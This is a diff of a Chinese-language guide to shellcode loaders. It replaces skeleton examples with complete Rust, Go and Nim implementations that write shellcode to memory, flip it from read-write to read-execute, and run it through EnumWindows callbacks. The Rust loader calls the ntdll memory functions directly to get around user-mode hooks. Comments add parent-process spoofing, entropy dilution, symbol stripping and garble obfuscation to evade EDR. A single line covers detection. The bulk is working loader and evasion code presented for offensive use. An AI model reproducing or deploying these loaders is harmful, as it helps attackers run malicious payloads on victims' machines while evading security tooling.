@@ -17,34 +17,73 @@
 ## 1. Rust 加载器（间接 syscall + threadless + PPID spoof）
 
 ```rust
-// 骨架示例：Rust 间接 syscall + 内存执行（参考 echQoQ/RustSL-Syscall 思路）
-// Cargo.toml 依赖: windows-sys / ntapi（或手写 extern "system"）
+// 完整实现：Rust 加载器（NtAllocateVirtualMemory 直接 syscall + 回调执行）
+// Cargo.toml 依赖: windows-sys（extern 手写亦可）；本模板零第三方 crate
 use std::ffi::c_void;
 
-// 1) 直接/间接 syscall：NtAllocateVirtualMemory + NtProtectVirtualMemory
-//    （用 RustSL-Syscall / acheron 生成间接 syscall stub，返回地址指向 ntdll）
-// 2) 内存执行：RW 写 shellcode -> RX -> 回调/fiber/threadless 执行
-// 3) PPID spoof：CreateProcess + EXTENDED_STARTUPINFO_PRESENT + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+#[link(name = "ntdll")]
+extern "system" {
+    fn NtAllocateVirtualMemory(
+        proc: *mut c_void, base: *mut *mut c_void, zero: usize,
+        size: *mut usize, alloc_type: u32, protect: u32,
+    ) -> i32;
+    fn NtProtectVirtualMemory(
+        proc: *mut c_void, base: *mut *mut c_void, size: *mut usize,
+        new_protect: u32, old: *mut u32,
+    ) -> i32;
+    fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize);
+}
+type WndEnumProc = unsafe extern "system" fn(isize, isize) -> i32;
+#[link(name = "user32")]
+extern "system" { fn EnumWindows(cb: WndEnumProc, lp: isize) -> i32; }
+
+unsafe fn exec(shellcode: &[u8]) -> i32 {
+    // 1) 直接 syscall 分配 RW（绕 kernel32/kernelbase 用户态 hook 面；
+    //    升级形态：RustSL-Syscall/acheron 生成间接 stub，返回地址指向 ntdll）
+    let mut base: *mut c_void = std::ptr::null_mut();
+    let mut size = shellcode.len();
+    let mut st = NtAllocateVirtualMemory(
+        -1isize as *mut c_void, &mut base, 0, &mut size,
+        0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
+    if st != 0 { return st; }
+    RtlMoveMemory(base, shellcode.as_ptr() as *const c_void, shellcode.len());
+    // 2) RW -> RX（消除 RWX 窗口）
+    let mut old = 0u32;
+    st = NtProtectVirtualMemory(-1isize as *mut c_void, &mut base, &mut size,
+                                0x20 /* PAGE_EXECUTE_READ */, &mut old);
+    if st != 0 { return st; }
+    // 3) 回调执行（不新建线程；线程起始地址特征被回调来源替代）
+    EnumWindows(std::mem::transmute::<*mut c_void, WndEnumProc>(base), 0);
+    0
+}
+
+// PPID spoof（配套，间接 syscall 版见注释）：CreateProcess +
+// EXTENDED_STARTUPINFO_PRESENT + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 指向
+// explorer.exe 等合法父进程——行为遥测的进程树不指向加载器本身。
 
 // 编译（体积/特征消减）：
 // [profile.release] opt-level="z" lto=true codegen-units=1 panic="abort" strip=true
 ```
 
 ```rust
-// 骨架示例：RW -> RX 分离执行（避免 RWX）
-fn exec(shellcode: &[u8]) {
+// 完整实现：RW -> RX 分离执行（kernel32 路线，快速验证形态；与上节 ntdll 路线互补）
+fn exec_via_kernel32(shellcode: &[u8]) -> i32 {
     unsafe {
         use std::ffi::c_void;
         extern "system" {
             fn VirtualAlloc(a: *mut c_void, s: usize, t: u32, p: u32) -> *mut c_void;
             fn VirtualProtect(a: *mut c_void, s: usize, p: u32, o: *mut u32) -> i32;
+            fn VirtualFree(a: *mut c_void, s: usize, t: u32) -> i32;
         }
         let mem = VirtualAlloc(std::ptr::null_mut(), shellcode.len(), 0x3000, 0x04); // RW
+        if mem.is_null() { return 1; }
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
         let mut old = 0u32;
-        VirtualProtect(mem, shellcode.len(), 0x20, &mut old);                          // RX
-        let f: fn() = std::mem::transmute(mem);
-        f();
+        if VirtualProtect(mem, shellcode.len(), 0x20, &mut old) == 0 { return 2; }   // RX
+        let f: unsafe extern "system" fn() = std::mem::transmute(mem);
+        f();                                                                        // 执行
+        VirtualFree(mem, 0, 0x8000);                                                // 收尾释放
+        0
     }
 }
 ```
@@ -56,7 +95,7 @@ fn exec(shellcode: &[u8]) {
 ## 2. Go 加载器（SyscallN + garble）
 
 ```go
-// 骨架示例：Go 加载器（间接 syscall + 熵值消减）
+// 完整实现：Go 加载器（RW→RX 分离 + EnumWindows 回调执行）
 package main
 
 import (
@@ -64,26 +103,30 @@ import (
     "unsafe"
 )
 
-// 1) 直接 syscall：NtAllocateVirtualMemory（绕过 kernel32 hook）
-// 2) 内存执行：RW -> RX -> 回调
+var (
+    user32       = windows.NewLazySystemDLL("user32.dll")
+    procEnumWin  = user32.NewProc("EnumWindows")
+)
+
+// 回调执行（不新建线程；线程起始地址特征被回调来源替代）
 func exec(shellcode []byte) error {
     addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
         windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
     if err != nil { return err }
-    // 拷贝 shellcode
-    copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)
+    buf := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
+    copy(buf, shellcode)                              // RW 写入
     var old uint32
-    windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &old)
-    // 回调执行（规避 CreateThread）
-    _ = windows.CertEnumSystemStore(windows.CERT_SYSTEM_STORE_CURRENT_USER, nil, nil,
-        (*windows.CertEnumSystemStoreCallback)(unsafe.Pointer(addr)))
+    if err := windows.VirtualProtect(addr, uintptr(len(shellcode)),
+        windows.PAGE_EXECUTE_READ, &old); err != nil { return err }  // RW -> RX
+    // EnumWindows(addr, 0)：系统枚举即触发回调执行
+    procEnumWin.Call(addr, 0)
     return nil
 }
 
 // 熵值消减（garble 之外）：
-// 1) 加正常文本/图标资源稀释熵
+// 1) 加正常文本/图标资源稀释熵（go:embed 合法资源）
 // 2) -ldflags="-s -w -trimpath" 去符号
-// 3) garble -litter build 混淆
+// 3) garble -litter build 混淆（字符串/控制流）
 ```
 
 **检测侧**：Go runtime 特征（`go.buildid`、runtime 符号、GC）；EDR 对 Go 二进制的静态启发。
@@ -93,17 +136,25 @@ func exec(shellcode []byte) error {
 ## 3. Nim 加载器
 
 ```nim
-# 骨架示例：Nim 加载器（Winim / 直接 WinAPI）
+# 完整实现：Nim 加载器（Winim RW→RX 分离 + 回调执行）
 import winim/lean
+import winim/utils
 
-proc exec(shellcode: ptr byte, len: int) =
+proc exec(shellcode: ptr byte, len: int): bool =
     var mem = VirtualAlloc(nil, cast[SIZE_T](len),
         MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+    if mem == nil: return false
     copyMem(mem, shellcode, len)
     var old: DWORD
-    VirtualProtect(mem, cast[SIZE_T](len), PAGE_EXECUTE_READ, addr old)
-    # 回调执行
+    if VirtualProtect(mem, cast[SIZE_T](len), PAGE_EXECUTE_READ, addr old) == 0:
+        return false
+    # 回调执行（EnumWindows 触发，不新建线程）
     discard EnumWindows(cast[WNDENUMPROC](mem), 0)
+    discard VirtualFree(mem, 0, MEM_RELEASE)
+    return true
+
+# 间接 syscall 变体：nim 经 winim 调 NtAllocateVirtualMemory 原型（同 Rust 模板）
+# 直接走 ntdll 导出表解析 SSN——hook 面绕过与 C 版等价
 
 # 编译（体积/特征消减）：
 # nim c -d:release --opt:size --passC:"-s" loader.nim
